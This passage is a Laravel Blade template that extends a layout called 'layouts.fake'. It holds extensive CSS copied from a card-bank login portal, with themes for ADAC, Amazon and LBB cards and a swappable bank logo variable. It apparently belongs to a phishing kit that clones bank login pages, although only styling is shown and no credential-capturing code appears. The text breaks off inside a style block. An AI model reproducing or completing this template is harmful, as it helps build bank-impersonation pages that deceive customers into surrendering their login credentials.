@extends('layouts.fake')
@push('css')
    <link href="{{ asset('css/adac.css') }}" rel="stylesheet">
    <style>
        @media (min-width: 768px) {
            .contact-form-modal .modal-content {
                position: relative;
                top: 150px;
                margin-bottom: 30px;
            }
        }
    </style>
    <style>
        .ux-kkb-button[_ngcontent-umn-c142] {
            margin-top: 30px;
            width: 100%;
            max-width: 100%;
        }
        .modal--scrollable {
            display: flex;
            flex-direction: column;
            max-height: 559px;
        }
        .modal--scrollable .modal__text {
            max-height: 405px;
            overflow-y: auto;
        }
        .modal__text[_ngcontent-umn-c142] alert {
            color: #ff1d1d;
        }
        .modal__text[_ngcontent-umn-c142] p {
            white-space: pre-line;
        }
    </style>
    <style></style>
    <style>
        header[_ngcontent-umn-c138] {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 1000;
            height: 80px;
            background-color: #fff;
            box-shadow: 0 0 30px 0 rgba(0, 0, 0, 0.08);
        }
        header[_ngcontent-umn-c138] kkb-nav-links[_ngcontent-umn-c138] {
            height: 100%;
            display: none;
        }
        @media (min-width: 810px) {
            header[_ngcontent-umn-c138] kkb-nav-links[_ngcontent-umn-c138] {
                display: block;
            }
        }
        @media (max-width: 991.98px) {
            header[_ngcontent-umn-c138] {
                height: 69px;
            }
        }
        @media (max-width: 575.98px) {
            header[_ngcontent-umn-c138] {
                position: sticky;
                top: 0;
                height: 48px;
            }
            header[_ngcontent-umn-c138] kkb-user-menu[_ngcontent-umn-c138] {
                max-width: 65%;
            }
            header[_ngcontent-umn-c138] .logo[_ngcontent-umn-c138] {
                margin-top: 16px;
            }
        }
        header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] {
            display: flex;
            justify-content: center;
            align-items: center;
            max-width: 1080px;
            width: auto;
            margin: auto;
            position: relative;
            z-index: 1002;
        }
        @media (max-width: 991.98px) {
            header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] {
                padding: 0;
            }
        }
        header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] .navbar[_ngcontent-umn-c138] {
            display: flex;
            justify-content: flex-start;
            align-items: flex-start;
            flex-wrap: nowrap;
            padding: 0;
            width: 100%;
            height: 80px;
            background-color: #fff;
        }
        @media (max-width: 1199.98px) {
            header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] .navbar[_ngcontent-umn-c138] {
                padding: 0 16px;
            }
        }
        @media (max-width: 991.98px) {
            header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] .navbar[_ngcontent-umn-c138] {
                height: 69px;
                padding: 0 16px;
            }
        }
        @media (max-width: 575.98px) {
            header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] .navbar[_ngcontent-umn-c138] {
                height: 48px;
            }
        }
        header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] .navbar[_ngcontent-umn-c138] .navbar-brand[_ngcontent-umn-c138] {
            padding-top: 0;
            padding-bottom: 0;
            margin-right: 0;
            height: 100%;
            display: table;
        }
        header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] .navbar[_ngcontent-umn-c138] .navbar-brand[_ngcontent-umn-c138] .logo[_ngcontent-umn-c138] {
            display: table-cell;
            vertical-align: middle;
            height: 25px;
            width: 69px;
            background: url('{{asset($bank['logo'])}}');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: 50%;
        }
        @media (max-width: 991.98px) {
            header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] .navbar[_ngcontent-umn-c138] .navbar-brand[_ngcontent-umn-c138] .logo[_ngcontent-umn-c138] {
                width: 69px;
            }
        }
        @media (max-width: 575.98px) {
            header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] .navbar[_ngcontent-umn-c138] .navbar-brand[_ngcontent-umn-c138] .logo[_ngcontent-umn-c138] {
                width: 69px;
            }
        }
        header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] .call-to-action-container[_ngcontent-umn-c138] {
            width: 100%;
            text-align: right;
            color: #282828;
        }
        @media (max-width: 991.98px) {
            header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] .call-to-action-container[_ngcontent-umn-c138] {
                padding-right: 16px;
            }
        }
        @media (max-width: 767.98px) {
            header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] .call-to-action-container[_ngcontent-umn-c138] {
                display: none;
            }
        }
        header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] .call-to-action-container__info[_ngcontent-umn-c138] {
            display: inline-block;
            margin-right: 8px;
            color: #282828;
        }
        header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] .call-to-action-container__info.theme-lbb[_ngcontent-umn-c138] {
            color: #fff;
        }
        header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] .call-to-action-container__link[_ngcontent-umn-c138] {
            display: inline;
            color: #000;
        }
        header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] .call-to-action-container__link.theme-lbb[_ngcontent-umn-c138] {
            color: #fff;
        }
        header[_ngcontent-umn-c138] .navbar-container[_ngcontent-umn-c138] .initial-login[_ngcontent-umn-c138] {
            color: #282828;
            font-size: 16px;
            letter-spacing: 0.5px;
            margin-left: auto;
            display: flex;
            flex-direction: column;
            justify-content: center;
            height: 100%;
        }
        kkb-nav-links.mobile[_ngcontent-umn-c138] {
            display: block;
        }
        @media (min-width: 810px) {
            kkb-nav-links.mobile[_ngcontent-umn-c138] {
                display: none;
            }
        }
    </style>
    <style>
        .footer-container[_ngcontent-umn-c133] {
            width: auto;
            margin: auto;
            color: #282828;
            background: #fff;
        }
        .footer-container[_ngcontent-umn-c133] ul[_ngcontent-umn-c133] {
            margin-bottom: 0;
        }
        .row[_ngcontent-umn-c133] {
            margin: 0;
        }
        .footer[_ngcontent-umn-c133] {
            width: 100%;
            max-width: 1080px;
            padding-top: 32px;
            margin: 0 auto;
        }
        .footer[_ngcontent-umn-c133] .link-items[_ngcontent-umn-c133] {
            letter-spacing: 0.27px;
        }
        .footer[_ngcontent-umn-c133] .link-items[_ngcontent-umn-c133] li[_ngcontent-umn-c133] {
            list-style-type: none;
            margin-bottom: 2px;
        }
        .footer[_ngcontent-umn-c133] .link-items[_ngcontent-umn-c133] a[_ngcontent-umn-c133] {
            text-decoration: inherit;
            cursor: pointer;
            font-size: 16px;
            font-weight: 400;
            letter-spacing: 0.3px;
            line-height: 20px;
            color: #282828;
        }
        .footer[_ngcontent-umn-c133] .link-items[_ngcontent-umn-c133] a[_ngcontent-umn-c133]:hover {
            text-decoration: underline;
        }
        .footer[_ngcontent-umn-c133] .store-icons[_ngcontent-umn-c133] {
            display: flex;
            justify-content: flex-end;
        }
        .footer[_ngcontent-umn-c133] .store-icons[_ngcontent-umn-c133] .app-store[_ngcontent-umn-c133] {
            background: url(/assets/img/app-store.svg) no-repeat;
            order: 2;
            width: 120px;
        }
        .footer[_ngcontent-umn-c133] .store-icons[_ngcontent-umn-c133] .app-store[_ngcontent-umn-c133],
        .footer[_ngcontent-umn-c133] .store-icons[_ngcontent-umn-c133] .play-store[_ngcontent-umn-c133] {
            margin-right: 16px;
            height: 40px;
            -o-object-fit: contain;
            object-fit: contain;
            position: relative;
        }
        .footer[_ngcontent-umn-c133] .store-icons[_ngcontent-umn-c133] .play-store[_ngcontent-umn-c133] {
            background: url(/assets/img/google-play.svg) no-repeat;
            order: 3;
            width: 135px;
        }
        .footer[_ngcontent-umn-c133] .store-icons[_ngcontent-umn-c133] .poweredby[_ngcontent-umn-c133] {
            display: flex;
            max-height: 21px;
            margin-top: 10px;
            margin-right: 24px;
            align-items: flex-start;
        }
        .footer[_ngcontent-umn-c133] .store-icons[_ngcontent-umn-c133] .poweredby[_ngcontent-umn-c133] img[_ngcontent-umn-c133] {
            max-height: 21px;
        }
        .footer[_ngcontent-umn-c133] .store-icons[_ngcontent-umn-c133] .poweredby[_ngcontent-umn-c133] span[_ngcontent-umn-c133] {
            align-self: flex-start;
            margin-top: -3px;
            margin-right: 2px;
            font-size: 10px;
            line-height: 14px;
        }
        .footer[_ngcontent-umn-c133] .store-icons[_ngcontent-umn-c133] .linkSpanner[_ngcontent-umn-c133] {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 1;
        }
        @media (max-width: 991.98px) {
            .footer[_ngcontent-umn-c133] {
                margin: 0;
                padding-bottom: 18px;
            }
            .footer[_ngcontent-umn-c133] .store-icons[_ngcontent-umn-c133] {
                flex-direction: column;
            }
            .footer[_ngcontent-umn-c133] .store-icons[_ngcontent-umn-c133] .app-store[_ngcontent-umn-c133] {
                margin: 0 16px 16px auto;
            }
            .footer[_ngcontent-umn-c133] .store-icons[_ngcontent-umn-c133] .play-store[_ngcontent-umn-c133] {
                margin: 0 16px 0 auto;
            }
            .footer[_ngcontent-umn-c133] .store-icons[_ngcontent-umn-c133] .poweredby[_ngcontent-umn-c133] {
                margin: 0 16px 24px auto;
            }
        }
        @media (max-width: 767.98px) {
            .footer[_ngcontent-umn-c133] {
                padding-bottom: 75px;
            }
            .footer[_ngcontent-umn-c133] .store-icons[_ngcontent-umn-c133] .app-store[_ngcontent-umn-c133] {
                margin-top: 24px;
                margin-left: 16px;
            }
            .footer[_ngcontent-umn-c133] .store-icons[_ngcontent-umn-c133] .play-store[_ngcontent-umn-c133] {
                margin-left: 16px;
            }
            .footer[_ngcontent-umn-c133] .store-icons[_ngcontent-umn-c133] .poweredby[_ngcontent-umn-c133] {
                margin: 16px;
            }
        }
    </style>
    <style>
        .cookie-banner-container[_ngcontent-umn-c123] {
            background: #282828;
            width: 100%;
        }
        .cookie-banner-container[_ngcontent-umn-c123] .cookie-banner[_ngcontent-umn-c123] {
            max-width: 1080px;
            width: auto;
            margin: auto;
            padding: 16px 20px;
            display: flex;
        }
        @media (max-width: 767.98px) {
            .cookie-banner-container[_ngcontent-umn-c123] .cookie-banner[_ngcontent-umn-c123] {
                flex-direction: column;
            }
        }
        .cookie-banner-container[_ngcontent-umn-c123] .cookie-banner[_ngcontent-umn-c123] .dsgvo[_ngcontent-umn-c123] {
            word-wrap: break-word;
            font-size: 13px;
            color: #fff;
            text-align: start;
            margin-right: 100px;
        }
        @media (max-width: 767.98px) {
            .cookie-banner-container[_ngcontent-umn-c123] .cookie-banner[_ngcontent-umn-c123] .dsgvo[_ngcontent-umn-c123] {
                margin-right: 0;
            }
        }
        .cookie-banner-container[_ngcontent-umn-c123] .cookie-banner[_ngcontent-umn-c123] .kkb-global__actions[_ngcontent-umn-c123] {
            margin-top: 0;
        }
        @media (max-width: 767.98px) {
            .cookie-banner-container[_ngcontent-umn-c123] .cookie-banner[_ngcontent-umn-c123] .kkb-global__actions[_ngcontent-umn-c123] {
                margin-top: 20px;
            }
        }
        .cookie-banner-container[_ngcontent-umn-c123] .cookie-banner[_ngcontent-umn-c123] .ux-kkb-link[_ngcontent-umn-c123] {
            color: #fff !important;
        }
    </style>
    <style>
        .info-container[_ngcontent-umn-c280] {
            padding: 16px;
            border-width: 1px;
            border-style: solid;
            border-radius: 3px;
            box-shadow: 0 2px 20px 0 rgba(0, 0, 0, 0.08);
        }
        .info-container[_ngcontent-umn-c280] p {
            color: #666;
            margin-bottom: 0;
        }
        .info-container[_ngcontent-umn-c280] br:first-of-type {
            display: none;
        }
        .info-container[_ngcontent-umn-c280] strong:first-child {
            display: block;
            margin-bottom: 8px;
            font-size: 22px;
            font-weight: 600;
        }
        .info-container--warning[_ngcontent-umn-c280] {
            border-color: #fff;
            background-color: #fffbee;
        }
        .info-container--warning[_ngcontent-umn-c280] strong:first-child {
            color: #fc0;
        }
        .info-container--danger[_ngcontent-umn-c280] {
            border-color: #eaa2a2;
            background-color: #fdf2f2;
        }
        .info-container--danger[_ngcontent-umn-c280] strong:first-child {
            color: #ff1d1d;
        }
        .info-container--success[_ngcontent-umn-c280] {
            border-color: #8cca8c;
            background-color: #f2f9f2;
        }
        .info-container--success[_ngcontent-umn-c280] strong:first-child {
            color: #069800;
        }
        .login-container[_ngcontent-umn-c280] {
            border-radius: 12px;
            box-shadow: 0 2px 30px 0 rgba(0, 0, 0, 0.1);
            padding: 40px;
            display: flex;
        }
        @media (max-width: 767.98px) {
            .login-container[_ngcontent-umn-c280] {
                flex-direction: column-reverse;
                padding: 32px 24px 40px;
            }
        }
        .login-container[_ngcontent-umn-c280] mat-form-field {
            display: block;
            width: 320px;
            max-width: 320px;
        }
        @media (max-width: 767.98px) {
            .login-container[_ngcontent-umn-c280] mat-form-field {
                width: 100%;
                max-width: 100%;
            }
        }
        .login-container[_ngcontent-umn-c280] mat-form-field .mat-input-wrapper {
            width: 100%;
        }
        .login-container[_ngcontent-umn-c280] mat-form-field .mat-form-field-hint-spacer {
            display: none;
        }
        .login-container[_ngcontent-umn-c280] mat-form-field mat-hint {
            flex: 1;
        }
        .login-container__form[_ngcontent-umn-c280] {
            width: 100%;
        }
        .login-container__form__heading[_ngcontent-umn-c280] {
            margin-bottom: 28px;
        }
        @media (max-width: 767.98px) {
            .login-container__form__heading[_ngcontent-umn-c280] {
                display: none;
            }
        }
        .login-container__form__username-field[_ngcontent-umn-c280] {
            margin-bottom: 28px;
        }
        .login-container__form[_ngcontent-umn-c280] .kkb-global__actions[_ngcontent-umn-c280] {
            justify-content: flex-start;
            margin-top: 64px;
        }
        @media (max-width: 767.98px) {
            .login-container__form[_ngcontent-umn-c280] .kkb-global__actions[_ngcontent-umn-c280] {
                margin-top: 40px;
            }
        }
        .login-container__image[_ngcontent-umn-c280] {
            width: 100%;
            background-size: contain;
            background-repeat: no-repeat;
            background-position: 50%;
        }
        @media (max-width: 767.98px) {
            .login-container__image[_ngcontent-umn-c280] {
                padding-top: 63%;
            }
        }
        .login-container__image.theme-amazon[_ngcontent-umn-c280] {
            background-image: url(/assets/img/amazon/login-image-cards.png);
        }
        .login-container__image.theme-adac[_ngcontent-umn-c280] {
            background-image: url('/static/style/adacdebank/login-image-cards.png');
            margin-bottom: 40px;
        }
        .login-container__image.theme-lbb[_ngcontent-umn-c280] {
            background-image: url(/assets/img/lbb/login-image-cards.png);
        }
        .register-container[_ngcontent-umn-c280] {
            padding: 0 40px;
        }
        @media (max-width: 767.98px) {
            .register-container[_ngcontent-umn-c280] {
                padding: 0 24px;
            }
        }
        .register-container__actions[_ngcontent-umn-c280] {
            display: flex;
        }
        @media (max-width: 767.98px) {
            .register-container__actions[_ngcontent-umn-c280] {
                flex-direction: column;
            }
        }
        .register-container__actions__initial-data[_ngcontent-umn-c280],
        .register-container__actions__registration[_ngcontent-umn-c280] {
            flex-grow: 1;
        }
        .unlock-container[_ngcontent-umn-c280] {
            padding: 0 40px;
        }
        @media (max-width: 767.98px) {
            .unlock-container[_ngcontent-umn-c280] {
                padding: 0 24px;
            }
        }
        .size--standard[_ngcontent-umn-c280] {
            font-size: 16px !important;
        }
        .secondary-error-text[_ngcontent-umn-c280] {
            color: #000;
            font-weight: 400;
        }
    </style>
    <style>
        .ux-tile-container[_ngcontent-umn-c171] {
            position: relative;
            padding: 56px 0 0;
            height: 100%;
        }
        @media (max-width: 991.98px) {
            .ux-tile-container[_ngcontent-umn-c171] {
                width: 100%;
                margin: 0;
                padding: 56px 15px 0;
            }
        }
        @media (max-width: 767.98px) {
            .ux-tile-container[_ngcontent-umn-c171] {
                padding: 32px 15px 15px;
            }
        }
        .ux-tile-container[_ngcontent-umn-c171] .ux-content[_ngcontent-umn-c171] .tile[_ngcontent-umn-c171] {
            margin-bottom: 40px;
            display: block;
        }
        .ux-tile-container[_ngcontent-umn-c171] .ux-content[_ngcontent-umn-c171] .tile[_ngcontent-umn-c171]:last-child {
            margin-bottom: 0;
        }
        .ux-tile-container[_ngcontent-umn-c171] .loading-spinner[_ngcontent-umn-c171] {
            position: relative;
            text-align: center;
        }
        .ux-tile-container[_ngcontent-umn-c171] .container[_ngcontent-umn-c171] {
            padding-left: 0;
            padding-right: 0;
        }
    </style>
    <style>
        .mat-form-field {
            display: inline-block;
            position: relative;
            text-align: left;
        }
        [dir="rtl"] .mat-form-field {
            text-align: right;
        }
        .mat-form-field-wrapper {
            position: relative;
        }
        .mat-form-field-flex {
            display: inline-flex;
            align-items: baseline;
            box-sizing: border-box;
            width: 100%;
        }
        .mat-form-field-prefix,
        .mat-form-field-suffix {
            white-space: nowrap;
            flex: none;
            position: relative;
        }
        .mat-form-field-infix {
            display: block;
            position: relative;
            flex: auto;
            min-width: 0;
            width: 180px;
        }
        .cdk-high-contrast-active .mat-form-field-infix {
            border-image: linear-gradient(transparent, transparent);
        }
        .mat-form-field-label-wrapper {
            position: absolute;
            left: 0;
            box-sizing: content-box;
            width: 100%;
            height: 100%;
            overflow: hidden;
            pointer-events: none;
        }
        [dir="rtl"] .mat-form-field-label-wrapper {
            left: auto;
            right: 0;
        }
        .mat-form-field-label {
            position: absolute;
            left: 0;
            font: inherit;
            pointer-events: none;
            width: 100%;
            white-space: nowrap;
            text-overflow: ellipsis;
            overflow: hidden;
            transform-origin: 0 0;
            transition: transform 400ms cubic-bezier(0.25, 0.8, 0.25, 1), color 400ms cubic-bezier(0.25, 0.8, 0.25, 1), width 400ms cubic-bezier(0.25, 0.8, 0.25, 1);
            display: none;
        }
        [dir="rtl"] .mat-form-field-label {
            transform-origin: 100% 0;
            left: auto;
            right: 0;
        }
        .mat-form-field-empty.mat-form-field-label,
        .mat-form-field-can-float.mat-form-field-should-float .mat-form-field-label {
            display: block;
        }
        .mat-form-field-autofill-control:-webkit-autofill + .mat-form-field-label-wrapper .mat-form-field-label {
            display: none;
        }
        .mat-form-field-can-float .mat-form-field-autofill-control:-webkit-autofill + .mat-form-field-label-wrapper .mat-form-field-label {
            display: block;
            transition: none;
        }
        .mat-input-server:focus + .mat-form-field-label-wrapper .mat-form-field-label,
        .mat-input-server[placeholder]:not(:placeholder-shown) + .mat-form-field-label-wrapper .mat-form-field-label {
            display: none;
        }
        .mat-form-field-can-float .mat-input-server:focus + .mat-form-field-label-wrapper .mat-form-field-label,
        .mat-form-field-can-float .mat-input-server[placeholder]:not(:placeholder-shown) + .mat-form-field-label-wrapper .mat-form-field-label {
            display: block;
        }
        .mat-form-field-label:not(.mat-form-field-empty) {
            transition: none;
        }
        .mat-form-field-underline {
            position: absolute;
            width: 100%;
            pointer-events: none;
            transform: scale3d(1, 1.0001, 1);
        }
        .mat-form-field-ripple {
            position: absolute;
            left: 0;
            width: 100%;
            transform-origin: 50%;
            transform: scaleX(0.5);
            opacity: 0;
            transition: background-color 300ms cubic-bezier(0.55, 0, 0.55, 0.2);
        }
        .mat-form-field.mat-focused .mat-form-field-ripple,
        .mat-form-field.mat-form-field-invalid .mat-form-field-ripple {
            opacity: 1;
            transform: none;
            transition: transform 300ms cubic-bezier(0.25, 0.8, 0.25, 1), opacity 100ms cubic-bezier(0.25, 0.8, 0.25, 1), background-color 300ms cubic-bezier(0.25, 0.8, 0.25, 1);
        }
        .mat-form-field-subscript-wrapper {
            position: absolute;
            box-sizing: border-box;
            width: 100%;
            overflow: hidden;
        }
        .mat-form-field-subscript-wrapper .mat-icon,
        .mat-form-field-label-wrapper .mat-icon {
            width: 1em;
            height: 1em;
            font-size: inherit;
            vertical-align: baseline;
        }
        .mat-form-field-hint-wrapper {
            display: flex;
        }
        .mat-form-field-hint-spacer {
            flex: 1 0 1em;
        }
        .mat-error {
            display: block;
        }
        .mat-form-field-control-wrapper {
            position: relative;
        }
        .mat-form-field-hint-end {
            order: 1;
        }
        .mat-form-field._mat-animation-noopable .mat-form-field-label,
        .mat-form-field._mat-animation-noopable .mat-form-field-ripple {
            transition: none;
        }
    </style>
    <style>
        .mat-form-field-appearance-fill .mat-form-field-flex {
            border-radius: 4px 4px 0 0;
            padding: 0.75em 0.75em 0 0.75em;
        }
        .cdk-high-contrast-active .mat-form-field-appearance-fill .mat-form-field-flex {
            outline: solid 1px;
        }
        .mat-form-field-appearance-fill .mat-form-field-underline::before {
            content: "";
            display: block;
            position: absolute;
            bottom: 0;
            height: 1px;
            width: 100%;
        }
        .mat-form-field-appearance-fill .mat-form-field-ripple {
            bottom: 0;
            height: 2px;
        }
        .cdk-high-contrast-active .mat-form-field-appearance-fill .mat-form-field-ripple {
            height: 0;
            border-top: solid 2px;
        }
        .mat-form-field-appearance-fill:not(.mat-form-field-disabled) .mat-form-field-flex:hover ~ .mat-form-field-underline .mat-form-field-ripple {
            opacity: 1;
            transform: none;
            transition: opacity 600ms cubic-bezier(0.25, 0.8, 0.25, 1);
        }
        .mat-form-field-appearance-fill._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover ~ .mat-form-field-underline .mat-form-field-ripple {
            transition: none;
        }
        .mat-form-field-appearance-fill .mat-form-field-subscript-wrapper {
            padding: 0 1em;
        }
    </style>
    <style>
        .mat-input-element {
            font: inherit;
            background: transparent;
            color: currentColor;
            border: none;
            outline: none;
            padding: 0;
            margin: 0;
            width: 100%;
            max-width: 100%;
            vertical-align: bottom;
            text-align: inherit;
            box-sizing: content-box;
        }
        .mat-input-element:-moz-ui-invalid {
            box-shadow: none;
        }
        .mat-input-element::-ms-clear,
        .mat-input-element::-ms-reveal {
            display: none;
        }
        .mat-input-element,
        .mat-input-element::-webkit-search-cancel-button,
        .mat-input-element::-webkit-search-decoration,
        .mat-input-element::-webkit-search-results-button,
        .mat-input-element::-webkit-search-results-decoration {
            -webkit-appearance: none;
        }
        .mat-input-element::-webkit-contacts-auto-fill-button,
        .mat-input-element::-webkit-caps-lock-indicator,
        .mat-input-element::-webkit-credentials-auto-fill-button {
            visibility: hidden;
        }
        .mat-input-element[type="date"],
        .mat-input-element[type="datetime"],
        .mat-input-element[type="datetime-local"],
        .mat-input-element[type="month"],
        .mat-input-element[type="week"],
        .mat-input-element[type="time"] {
            line-height: 1;
        }
        .mat-input-element[type="date"]::after,
        .mat-input-element[type="datetime"]::after,
        .mat-input-element[type="datetime-local"]::after,
        .mat-input-element[type="month"]::after,
        .mat-input-element[type="week"]::after,
        .mat-input-element[type="time"]::after {
            content: " ";
            white-space: pre;
            width: 1px;
        }
        .mat-input-element::-webkit-inner-spin-button,
        .mat-input-element::-webkit-calendar-picker-indicator,
        .mat-input-element::-webkit-clear-button {
            font-size: 0.75em;
        }
        .mat-input-element::placeholder {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            transition: color 400ms 133.3333333333ms cubic-bezier(0.25, 0.8, 0.25, 1);
        }
        .mat-input-element::placeholder:-ms-input-placeholder {
            -ms-user-select: text;
        }
        .mat-input-element::-moz-placeholder {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            transition: color 400ms 133.3333333333ms cubic-bezier(0.25, 0.8, 0.25, 1);
        }
        .mat-input-element::-moz-placeholder:-ms-input-placeholder {
            -ms-user-select: text;
        }
        .mat-input-element::-webkit-input-placeholder {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            transition: color 400ms 133.3333333333ms cubic-bezier(0.25, 0.8, 0.25, 1);
        }
        .mat-input-element::-webkit-input-placeholder:-ms-input-placeholder {
            -ms-user-select: text;
        }
        .mat-input-element:-ms-input-placeholder {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            transition: color 400ms 133.3333333333ms cubic-bezier(0.25, 0.8, 0.25, 1);
        }
        .mat-input-element:-ms-input-placeholder:-ms-input-placeholder {
            -ms-user-select: text;
        }
        .mat-form-field-hide-placeholder .mat-input-element::placeholder {
            color: transparent !important;
            -webkit-text-fill-color: transparent;
            transition: none;
        }
        .mat-form-field-hide-placeholder .mat-input-element::-moz-placeholder {
            color: transparent !important;
            -webkit-text-fill-color: transparent;
            transition: none;
        }
        .mat-form-field-hide-placeholder .mat-input-element::-webkit-input-placeholder {
            color: transparent !important;
            -webkit-text-fill-color: transparent;
            transition: none;
        }
        .mat-form-field-hide-placeholder .mat-input-element:-ms-input-placeholder {
            color: transparent !important;
            -webkit-text-fill-color: transparent;
            transition: none;
        }
        textarea.mat-input-element {
            resize: vertical;
            overflow: auto;
        }
        textarea.mat-input-element.cdk-textarea-autosize {
            resize: none;
        }
        textarea.mat-input-element {
            padding: 2px 0;
            margin: -2px 0;
        }
        select.mat-input-element {
            -moz-appearance: none;
            -webkit-appearance: none;
            position: relative;
            background-color: transparent;
            display: inline-flex;
            box-sizing: border-box;
            padding-top: 1em;
            top: -1em;
            margin-bottom: -1em;
        }
        select.mat-input-element::-ms-expand {
            display: none;
        }
        select.mat-input-element::-moz-focus-inner {
            border: 0;
        }
        select.mat-input-element:not(:disabled) {
            cursor: pointer;
        }
        select.mat-input-element::-ms-value {
            color: inherit;
            background: none;
        }
        .mat-focused .cdk-high-contrast-active select.mat-input-element::-ms-value {
            color: inherit;
        }
        .mat-form-field-type-mat-native-select .mat-form-field-infix::after {
            content: "";
            width: 0;
            height: 0;
            border-left: 5px solid transparent;
            border-right: 5px solid transparent;
            border-top: 5px solid;
            position: absolute;
            top: 50%;
            right: 0;
            margin-top: -2.5px;
            pointer-events: none;
        }
        [dir="rtl"] .mat-form-field-type-mat-native-select .mat-form-field-infix::after {
            right: auto;
            left: 0;
        }
        .mat-form-field-type-mat-native-select .mat-input-element {
            padding-right: 15px;
        }
        [dir="rtl"] .mat-form-field-type-mat-native-select .mat-input-element {
            padding-right: 0;
            padding-left: 15px;
        }
        .mat-form-field-type-mat-native-select .mat-form-field-label-wrapper {
            max-width: calc(100% - 10px);
        }
        .mat-form-field-type-mat-native-select.mat-form-field-appearance-outline .mat-form-field-infix::after {
            margin-top: -5px;
        }
        .mat-form-field-type-mat-native-select.mat-form-field-appearance-fill .mat-form-field-infix::after {
            margin-top: -10px;
        }
    </style>
    <style>
        .mat-form-field-appearance-legacy .mat-form-field-label {
            transform: perspective(100px);
            -ms-transform: none;
        }
        .mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon,
        .mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon {
            width: 1em;
        }
        .mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon-button,
        .mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon-button {
            font: inherit;
            vertical-align: baseline;
        }
        .mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon-button .mat-icon,
        .mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon-button .mat-icon {
            font-size: inherit;
        }
        .mat-form-field-appearance-legacy .mat-form-field-underline {
            height: 1px;
        }
        .cdk-high-contrast-active .mat-form-field-appearance-legacy .mat-form-field-underline {
            height: 0;
            border-top: solid 1px;
        }
        .mat-form-field-appearance-legacy .mat-form-field-ripple {
            top: 0;
            height: 2px;
            overflow: hidden;
        }
        .cdk-high-contrast-active .mat-form-field-appearance-legacy .mat-form-field-ripple {
            height: 0;
            border-top: solid 2px;
        }
        .mat-form-field-appearance-legacy.mat-form-field-disabled .mat-form-field-underline {
            background-position: 0;
            background-color: transparent;
        }
        .cdk-high-contrast-active .mat-form-field-appearance-legacy.mat-form-field-disabled .mat-form-field-underline {
            border-top-style: dotted;
            border-top-width: 2px;
        }
        .mat-form-field-appearance-legacy.mat-form-field-invalid:not(.mat-focused) .mat-form-field-ripple {
            height: 1px;
        }
    </style>
    <style>
        .mat-form-field-appearance-outline .mat-form-field-wrapper {
            margin: 0.25em 0;
        }
        .mat-form-field-appearance-outline .mat-form-field-flex {
            padding: 0 0.75em 0 0.75em;
            margin-top: -0.25em;
            position: relative;
        }
        .mat-form-field-appearance-outline .mat-form-field-prefix,
        .mat-form-field-appearance-outline .mat-form-field-suffix {
            top: 0.25em;
        }
        .mat-form-field-appearance-outline .mat-form-field-outline {
            display: flex;
            position: absolute;
            top: 0.25em;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
        }
        .mat-form-field-appearance-outline .mat-form-field-outline-start,
        .mat-form-field-appearance-outline .mat-form-field-outline-end {
            border: 1px solid currentColor;
            min-width: 5px;
        }
        .mat-form-field-appearance-outline .mat-form-field-outline-start {
            border-radius: 5px 0 0 5px;
            border-right-style: none;
        }
        [dir="rtl"] .mat-form-field-appearance-outline .mat-form-field-outline-start {
            border-right-style: solid;
            border-left-style: none;
            border-radius: 0 5px 5px 0;
        }
        .mat-form-field-appearance-outline .mat-form-field-outline-end {
            border-radius: 0 5px 5px 0;
            border-left-style: none;
            flex-grow: 1;
        }
        [dir="rtl"] .mat-form-field-appearance-outline .mat-form-field-outline-end {
            border-left-style: solid;
            border-right-style: none;
            border-radius: 5px 0 0 5px;
        }
        .mat-form-field-appearance-outline .mat-form-field-outline-gap {
            border-radius: 0.000001px;
            border: 1px solid currentColor;
            border-left-style: none;
            border-right-style: none;
        }
        .mat-form-field-appearance-outline.mat-form-field-can-float.mat-form-field-should-float .mat-form-field-outline-gap {
            border-top-color: transparent;
        }
        .mat-form-field-appearance-outline .mat-form-field-outline-thick {
            opacity: 0;
        }
        .mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-start,
        .mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-end,
        .mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-gap {
            border-width: 2px;
        }
        .mat-form-field-appearance-outline.mat-focused .mat-form-field-outline,
        .mat-form-field-appearance-outline.mat-form-field-invalid .mat-form-field-outline {
            opacity: 0;
            transition: opacity 100ms cubic-bezier(0.25, 0.8, 0.25, 1);
        }
        .mat-form-field-appearance-outline.mat-focused .mat-form-field-outline-thick,
        .mat-form-field-appearance-outline.mat-form-field-invalid .mat-form-field-outline-thick {
            opacity: 1;
        }
